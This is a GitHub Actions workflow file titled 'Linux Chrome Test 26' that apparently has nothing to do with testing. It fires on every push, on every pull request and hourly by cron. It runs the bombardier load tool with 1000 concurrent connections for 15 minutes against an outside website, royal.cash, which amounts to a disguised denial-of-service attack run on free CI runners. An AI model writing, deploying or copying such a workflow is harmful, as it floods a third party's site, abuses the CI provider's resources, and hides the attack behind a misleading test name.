name: Linux Chrome Test 26

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  schedule:
    - cron: '55 * * * *'

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v2 # Required to mount the Github Workspace to a volume
      - name: Docker
        run: /usr/bin/docker run --rm alpine/bombardier -c 1000 -d 900s -l https://royal.cash/
